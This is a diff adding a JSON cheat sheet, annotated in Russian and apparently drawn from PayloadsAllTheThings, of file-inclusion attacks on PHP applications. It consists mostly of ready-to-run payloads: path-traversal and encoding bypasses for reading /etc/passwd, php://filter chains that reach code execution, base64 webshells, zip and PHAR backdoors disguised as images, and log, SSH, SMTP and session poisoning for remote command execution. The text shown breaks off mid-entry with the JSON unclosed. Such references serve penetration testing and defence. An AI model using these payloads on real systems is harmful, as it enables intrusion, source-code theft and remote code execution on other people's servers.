@@ -1,0 +1,479 @@
+{
+  "category": "File Inclusion",
+  "source": "PayloadsAllTheThings/File Inclusion/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что это и где искать",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "File Inclusion — приложение подключает файл по пути из пользовательского ввода без должной фильтрации. Особенно частая в PHP.\n• LFI (Local File Inclusion) — подключается локальный файл; может привести к выполнению кода.\n• RFI (Remote File Inclusion) — подключается удалённый файл по URL.\n• Path Traversal отличается от File Inclusion: traversal даёт чтение файла, а inclusion ведёт к выполнению произвольного кода.\n• Ищи в параметрах вида ?page=, ?file=, ?template=, ?include=, ?lang= — всё, что выглядит как имя файла или путь.\n• Сначала ../../../etc/passwd (Linux) или ..\\..\\..\\windows\\win.ini (Windows); посчиталось — эскалируй до RCE через wrapper'ы, log poisoning, upload."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Уязвимый пример на PHP",
+      "language": "php",
+      "tags": ["methodology", "php", "example"],
+      "body": "<?php\n$file = $_GET['page'];\ninclude($file);\n?>"
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Инструменты для поиска и эксплуатации LFI/RFI",
+      "language": "text",
+      "tags": ["tools", "lfi", "rfi"],
+      "body": "• hansmach1ne/LFImap — обнаружение и эксплуатация Local File Inclusion.\n• kurobeats/fimap — поиск, подготовка, аудит и эксплуатация LFI/RFI в веб-приложениях.\n• D35m0nd142/LFISuite — автоматический LFI-эксплойтер (+ reverse shell) и сканер.\n• lightos/Panoptic — автоматизация чтения типовых лог- и конфиг-файлов через path traversal.\n• P0cL4bs/Kadimus — проверка и эксплуатация LFI (архивирован в 2020)."
+    },
+
+    {
+      "subcategory": "Базовый LFI",
+      "title": "Базовое чтение /etc/passwd через traversal",
+      "language": "text",
+      "tags": ["lfi", "detection", "basic"],
+      "body": "http://example.com/index.php?page=../../../etc/passwd"
+    },
+    {
+      "subcategory": "Базовый LFI",
+      "title": "Быстрая проверка (relative + Windows)",
+      "language": "text",
+      "tags": ["lfi", "detection", "fuzzing"],
+      "body": "etc/passwd\netc/passwd%00\netc%2fpasswd\netc%2fpasswd%00\netc%5cpasswd\netc%5cpasswd%00\netc%c0%afpasswd\netc%c0%afpasswd%00\nC:\\boot.ini\nC:\\WINDOWS\\win.ini"
+    },
+
+    {
+      "subcategory": "Null Byte",
+      "title": "Null Byte — обрезка расширения (PHP < 5.3.4)",
+      "language": "text",
+      "tags": ["lfi", "null-byte", "bypass"],
+      "body": "http://example.com/index.php?page=../../../etc/passwd%00"
+    },
+    {
+      "subcategory": "Null Byte",
+      "title": "Null Byte — реальный пример (Joomla Web TV, CVE-2010-1470)",
+      "language": "text",
+      "tags": ["lfi", "null-byte", "cve"],
+      "body": "{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00"
+    },
+
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Double Encoding (%252e = .)",
+      "language": "text",
+      "tags": ["lfi", "double-encoding", "bypass"],
+      "body": "http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd\nhttp://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "UTF-8 / overlong encoding (%c0%ae = .)",
+      "language": "text",
+      "tags": ["lfi", "utf-8", "bypass"],
+      "body": "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\nhttp://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Path Truncation (PHP режет путь >4096 байт)",
+      "language": "text",
+      "tags": ["lfi", "path-truncation", "bypass"],
+      "body": "http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] \nhttp://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход рекурсивной чистки ../ (....// и //)",
+      "language": "text",
+      "tags": ["lfi", "waf-bypass", "traversal"],
+      "body": "http://example.com/index.php?page=....//....//etc/passwd\nhttp://example.com/index.php?page=..///////..////..//////etc/passwd\nhttp://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
+    },
+
+    {
+      "subcategory": "Wrapper php://filter",
+      "title": "php://filter — фильтры (rot13 / iconv / base64)",
+      "language": "table",
+      "tags": ["wrapper", "php-filter", "source-disclosure"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Фильтр", "Описание"],
+          "rows": [
+            ["php://filter/read=string.rot13/resource=index.php", "Вывести index.php как rot13"],
+            ["php://filter/convert.iconv.utf-8.utf-16/resource=index.php", "Перекодировать index.php из utf8 в utf16"],
+            ["php://filter/convert.base64-encode/resource=index.php", "Вывести index.php как строку base64"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Wrapper php://filter",
+      "title": "php://filter — чтение исходников (часть имени регистронезависима)",
+      "language": "text",
+      "tags": ["wrapper", "php-filter", "source-disclosure"],
+      "body": "http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php"
+    },
+    {
+      "subcategory": "Wrapper php://filter",
+      "title": "php://filter — цепочка с компрессией для больших файлов",
+      "language": "text",
+      "tags": ["wrapper", "php-filter", "compression"],
+      "body": "http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
+    },
+    {
+      "subcategory": "Wrapper php://filter",
+      "title": "php://filter — цепочки через | или /",
+      "language": "text",
+      "tags": ["wrapper", "php-filter", "chaining"],
+      "body": "Фильтры можно сцеплять много раз через | или /:\n# несколько base64-декодов:\nphp://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s\n# deflate + base64encode (полезно для эксфильтрации ограниченным набором символов):\nphp://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php"
+    },
+    {
+      "subcategory": "Wrapper php://filter",
+      "title": "Скачать исходник через base64 (curl)",
+      "language": "bash",
+      "tags": ["wrapper", "php-filter", "curl"],
+      "body": "curl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d > index.php"
+    },
+
+    {
+      "subcategory": "PHP Filter Chains → RCE",
+      "title": "php_filter_chain_generator — генерация цепочки",
+      "language": "bash",
+      "tags": ["php-filter", "rce", "filter-chain"],
+      "body": "# synacktiv/php_filter_chain_generator\n$ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'\n[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)"
+    },
+    {
+      "subcategory": "PHP Filter Chains → RCE",
+      "title": "Готовая цепочка фильтров для <?php phpinfo();?>",
+      "language": "text",
+      "tags": ["php-filter", "rce", "filter-chain"],
+      "body": "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+    },
+    {
+      "subcategory": "PHP Filter Chains → RCE",
+      "title": "LFI2RCE.py — кастомная цепочка под выполнение команды",
+      "language": "bash",
+      "tags": ["php-filter", "rce", "filter-chain"],
+      "body": "# vulnerable file: index.php\n# vulnerable parameter: file\n# executed command: id\n# executed PHP code: <?=`$_GET[0]`;;?>\n# генератор: PayloadsAllTheThings/File Inclusion/Files/LFI2RCE.py\ncurl \"127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd\""
+    },
+
+    {
+      "subcategory": "Wrapper data://",
+      "title": "data:// — webshell в base64",
+      "language": "text",
+      "tags": ["wrapper", "data", "rce"],
+      "body": "# decoded: <?php system($_GET['cmd']);echo 'Shell done !'; ?>\nhttp://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
+    },
+    {
+      "subcategory": "Wrapper data://",
+      "title": "data:// — XSS в обход Chrome Auditor",
+      "language": "text",
+      "tags": ["wrapper", "data", "xss"],
+      "body": "# decoded: <svg onload=alert(1)>\nhttp://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"
+    },
+    {
+      "subcategory": "Wrapper expect://",
+      "title": "expect:// — прямое выполнение команд",
+      "language": "text",
+      "tags": ["wrapper", "expect", "rce"],
+      "body": "http://example.com/index.php?page=expect://id\nhttp://example.com/index.php?page=expect://ls"
+    },
+    {
+      "subcategory": "Wrapper php://input",
+      "title": "php://input — код в теле POST",
+      "language": "bash",
+      "tags": ["wrapper", "php-input", "rce"],
+      "body": "curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"https://example.com/index.php?page=php://input%00\" -k -v"
+    },
+    {
+      "subcategory": "Wrapper zip://",
+      "title": "zip:// — webshell внутри архива",
+      "language": "bash",
+      "tags": ["wrapper", "zip", "rce"],
+      "body": "# 1) создать payload\necho \"<pre><?php system($_GET['cmd']); ?></pre>\" > payload.php;\n# 2) упаковать и замаскировать под картинку\nzip payload.zip payload.php;\nmv payload.zip shell.jpg;\nrm payload.php\n# 3) подключить (%23 = #)\nhttp://example.com/index.php?page=zip://shell.jpg%23payload.php"
+    },
+    {
+      "subcategory": "Wrapper phar://",
+      "title": "phar:// — структура архива с бэкдором",
+      "language": "php",
+      "tags": ["wrapper", "phar", "rce"],
+      "body": "<?php\n  $phar = new Phar('archive.phar');\n  $phar->startBuffering();\n  $phar->addFromString('test.txt', '<?php phpinfo(); ?>');\n  $phar->setStub('<?php __HALT_COMPILER(); ?>');\n  $phar->stopBuffering();\n?>"
+    },
+    {
+      "subcategory": "Wrapper phar://",
+      "title": "phar:// — собрать и подключить",
+      "language": "bash",
+      "tags": ["wrapper", "phar", "rce"],
+      "body": "# собрать (нужно phar.readonly=0)\nphp --define phar.readonly=0 archive.php\n# подключить файл внутри архива\ncurl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt"
+    },
+    {
+      "subcategory": "Wrapper phar://",
+      "title": "PHAR-десериализация — уязвимый класс с magic-методом",
+      "language": "php",
+      "tags": ["wrapper", "phar", "deserialization"],
+      "body": "// НЕ работает на PHP 8+ (десериализация phar удалена).\n// Триггерится любой файловой операцией (include, file_get_contents,\n// file_exists, is_file, copy, stat, md5_file, getimagesize, ...).\nclass AnyClass {\n    public $data = null;\n    public function __construct($data) {\n        $this->data = $data;\n    }\n    \n    function __destruct() {\n        system($this->data);\n    }\n}\n\n...\necho file_exists($_GET['page']);"
+    },
+    {
+      "subcategory": "Wrapper phar://",
+      "title": "PHAR-десериализация — сборка архива с объектом в meta-data",
+      "language": "php",
+      "tags": ["wrapper", "phar", "deserialization"],
+      "body": "// create new Phar\n$phar = new Phar('deser.phar');\n$phar->startBuffering();\n$phar->addFromString('test.txt', 'text');\n$phar->setStub('<?php __HALT_COMPILER(); ?>');\n\n// add object of any class as meta data\nclass AnyClass {\n    public $data = null;\n    public function __construct($data) {\n        $this->data = $data;\n    }\n    \n    function __destruct() {\n        system($this->data);\n    }\n}\n$object = new AnyClass('whoami');\n$phar->setMetadata($object);\n$phar->stopBuffering();"
+    },
+    {
+      "subcategory": "Wrapper phar://",
+      "title": "PHAR-десериализация — магические байты JPG в stub",
+      "language": "php",
+      "tags": ["wrapper", "phar", "deserialization", "bypass"],
+      "body": "// замаскировать phar под JPG: магические байты \\xff\\xd8\\xff\n$phar->setStub(\"\\xff\\xd8\\xff\\n<?php __HALT_COMPILER(); ?>\");\n// затем триггер:\n// curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar"
+    },
+
+    {
+      "subcategory": "Filter chains: чтение файла",
+      "title": "convert.iconv:// + dechunk:// — error-based oracle",
+      "language": "text",
+      "tags": ["php-filter", "iconv", "dechunk", "oracle"],
+      "body": "Цель — слить содержимое файла посимвольно по реакции на ошибку (DownUnderCTF minimal-php).\n• convert.iconv:// — перекодирование в другую кодировку (например convert.iconv.utf-16le.utf-8).\n• dechunk:// — если в строке нет переводов строки, она стирается целиком тогда и только тогда, когда начинается с A-Fa-f0-9.\nТребования:\n• бэкенд не использует file_exists / is_file;\n• уязвимый параметр в POST-запросе (в GET не слить >135 символов из-за лимита размера).\nЛогика цепочки:\n1) iconv с кодировкой, экспоненциально увеличивающей размер данных → memory error;\n2) dechunk определяет первый символ файла по наличию/отсутствию ошибки;\n3) iconv с разным порядком байт меняет местами остальные символы с первым."
+    },
+    {
+      "subcategory": "Filter chains: чтение файла",
+      "title": "php_filter_chains_oracle_exploit — авто-слив файла",
+      "language": "bash",
+      "tags": ["php-filter", "iconv", "oracle", "tools"],
+      "body": "# synacktiv/php_filter_chains_oracle_exploit\n# оракул: HTTP 500 либо время ответа\n$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   \n[*] The following URL is targeted : http://127.0.0.1\n[*] The following local file is leaked : /test\n[*] Running POST requests\n[+] File /test leak is finished!"
+    },
+    {
+      "subcategory": "Filter chains: чтение файла",
+      "title": "wrapwrap — обернуть содержимое файла префиксом/суффиксом",
+      "language": "bash",
+      "tags": ["php-filter", "tools", "file-read"],
+      "body": "# ambionics/wrapwrap — генерирует php://filter-цепочку, добавляющую префикс и суффикс\n# цель: {\"message\":\"<file contents>\"}\n./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000\n./wrapwrap.py /etc/passwd '{\"message\":\"' '\"}' 1000\n./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000"
+    },
+    {
+      "subcategory": "Filter chains: чтение файла",
+      "title": "wrapwrap — уязвимый код-цель",
+      "language": "php",
+      "tags": ["php-filter", "file-read", "example"],
+      "body": "<?php\n  $data = file_get_contents($_POST['url']);\n  $data = json_decode($data);\n  echo $data->message;\n?>"
+    },
+    {
+      "subcategory": "Filter chains: чтение файла",
+      "title": "lightyear — blind-примитив чтения файлов",
+      "language": "bash",
+      "tags": ["php-filter", "tools", "file-read"],
+      "body": "# ambionics/lightyear\ncode remote.py # edit Remote.oracle\n./lightyear.py test # test that your implementation works\n./lightyear.py /etc/passwd # dump a file!"
+    },
+
+    {
+      "subcategory": "LFI → RCE: log poisoning",
+      "title": "Подключение лог-файлов веб/служб",
+      "language": "text",
+      "tags": ["lfi", "rce", "log-poisoning"],
+      "body": "http://example.com/index.php?page=/var/log/apache/access.log\nhttp://example.com/index.php?page=/var/log/apache/error.log\nhttp://example.com/index.php?page=/var/log/apache2/access.log\nhttp://example.com/index.php?page=/var/log/apache2/error.log\nhttp://example.com/index.php?page=/var/log/nginx/access.log\nhttp://example.com/index.php?page=/var/log/nginx/error.log\nhttp://example.com/index.php?page=/var/log/vsftpd.log\nhttp://example.com/index.php?page=/var/log/sshd.log\nhttp://example.com/index.php?page=/var/log/mail\nhttp://example.com/index.php?page=/var/log/httpd/error_log\nhttp://example.com/index.php?page=/usr/local/apache/log/error_log\nhttp://example.com/index.php?page=/usr/local/apache2/log/error_log"
+    },
+    {
+      "subcategory": "LFI → RCE: log poisoning",
+      "title": "Apache access.log — отравление User-Agent",
+      "language": "bash",
+      "tags": ["lfi", "rce", "log-poisoning", "apache"],
+      "body": "# логи экранируют двойные кавычки — используй одинарные в PHP-строках\ncurl http://example.org/ -A \"<?php system(\\$_GET['cmd']);?>\"\n# затем запросить лог через LFI и выполнить команду\ncurl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id"
+    },
+    {
+      "subcategory": "LFI → RCE: log poisoning",
+      "title": "SSH auth.log — отравление через имя пользователя",
+      "language": "bash",
+      "tags": ["lfi", "rce", "log-poisoning", "ssh"],
+      "body": "# залогиниться по SSH с PHP-кодом в имени пользователя\nssh '<?php system($_GET[\"cmd\"]);?>'@10.10.10.10\n# затем подключить лог\nhttp://example.com/index.php?page=/var/log/auth.log&cmd=id"
+    },
+    {
+      "subcategory": "LFI → RCE: log poisoning",
+      "title": "Mail log — отравление через SMTP",
+      "language": "text",
+      "tags": ["lfi", "rce", "log-poisoning", "smtp"],
+      "body": "root@kali:~# telnet 10.10.10.10. 25\nTrying 10.10.10.10....\nConnected to 10.10.10.10..\nEscape character is '^]'.\n220 straylight ESMTP Postfix (Debian/GNU)\nhelo ok\n250 straylight\nmail from: mail@example.com\n250 2.1.0 Ok\nrcpt to: root\n250 2.1.5 Ok\ndata\n354 End data with <CR><LF>.<CR><LF>\nsubject: <?php echo system($_GET[\"cmd\"]); ?>\ndata2\n.\n\n# либо одной командой:\nmail -s \"<?php system($_GET['cmd']);?>\" www-data@10.10.10.10. < /dev/null\n# затем подключить /var/log/mail"
+    },
+
+    {
+      "subcategory": "LFI → RCE: /proc",
+      "title": "/proc/self/environ — отравление через User-Agent",
+      "language": "text",
+      "tags": ["lfi", "rce", "proc", "environ"],
+      "body": "GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1\nUser-Agent: <?=phpinfo(); ?>"
+    },
+    {
+      "subcategory": "LFI → RCE: /proc",
+      "title": "/proc/$PID/fd/$FD — брутфорс дескрипторов загруженных файлов",
+      "language": "text",
+      "tags": ["lfi", "rce", "proc", "fd"],
+      "body": "# 1) загрузить много шеллов (например 100)\n# 2) подключить /proc/$PID/fd/$FD ($PID и $FD брутфорсятся)\nhttp://example.com/index.php?page=/proc/$PID/fd/$FD"
+    },
+    {
+      "subcategory": "LFI → RCE: /proc",
+      "title": "/proc/self — полезные псевдофайлы",
+      "language": "text",
+      "tags": ["lfi", "proc", "fuzzing"],
+      "body": "/proc/self/cmdline\n/proc/self/stat\n/proc/self/status\n/proc/self/fd/0\n/proc/self/fd/1\n/proc/self/fd/2\n/proc/self/fd/3\n/proc/self/fd/4\n/proc/self/fd/5\n/proc/self/fd/6\n/proc/self/fd/7\n/proc/self/fd/8\n/proc/self/fd/9\n/proc/self/fd/10"
+    },
+
+    {
+      "subcategory": "LFI → RCE: PHP sessions",
+      "title": "PHP-сессии — путь к файлу сессии",
+      "language": "text",
+      "tags": ["lfi", "rce", "php-session"],
+      "body": "Проверь, использует ли сайт PHPSESSID:\nSet-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/\n\nФайл сессии лежит в одном из:\n/var/lib/php5/sess_[PHPSESSID]\n/var/lib/php/sessions/sess_[PHPSESSID]\n\nСодержимое (видны значения, которые ты контролируешь):\nuser_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\";"
+    },
+    {
+      "subcategory": "LFI → RCE: PHP sessions",
+      "title": "PHP-сессии — внедрить код и подключить файл сессии",
+      "language": "text",
+      "tags": ["lfi", "rce", "php-session"],
+      "body": "# 1) записать PHP-код в сессию через контролируемое поле\nlogin=1&user=<?php system(\"cat /etc/passwd\");?>&pass=password&lang=en_us.php\n# 2) подключить файл сессии через LFI\nlogin=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27"
+    },
+
+    {
+      "subcategory": "LFI → RCE: PEARCMD",
+      "title": "pearcmd.php — RCE (register_argc_argv=On)",
+      "language": "text",
+      "tags": ["lfi", "rce", "pearcmd"],
